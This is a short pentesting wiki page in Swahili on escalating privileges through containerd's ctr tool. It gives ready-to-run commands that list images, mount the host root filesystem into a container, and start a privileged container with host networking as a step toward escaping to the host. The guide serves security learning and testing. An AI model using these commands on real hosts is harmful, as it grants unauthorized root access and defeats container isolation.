# Containerd (ctr) Privilege Escalation

## Maelezo ya msingi

Nenda kwenye kiungo kifuatacho ili kujifunza **`containerd` na `ctr` zinawekwa wapi katika container stack**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Ukigundua kuwa host ina amri ya `ctr`, CLI ya asili iliyojumuishwa na containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Unaweza kuorodhesha images zinazojulikana na containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Kisha **endesha mojawapo ya hizo images huku host root ikiwa recursively bind-mounted kwenye container root**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Endesha container katika privileged mode na ujaribu kufanya escape.\
Unaweza kuendesha privileged container ukitumia host networking kama ifuatavyo:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` huipa mchakato capabilities za Linux zinazotumika za caller na huondoa vidhibiti kadhaa vya isolation, lakini escape bado inategemea mazingira; tumia techniques zilizotajwa kwenye ukurasa ufuatao kuijaribu:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Kuanza kutumia containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Utekelezaji wa amri ya ctr image](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Utekelezaji wa amri ya ctr run](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Nyaraka za Linux kernel kuhusu shared-subtree](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Package ya containerd OCI: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Flags za amri ya containerd `ctr`](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
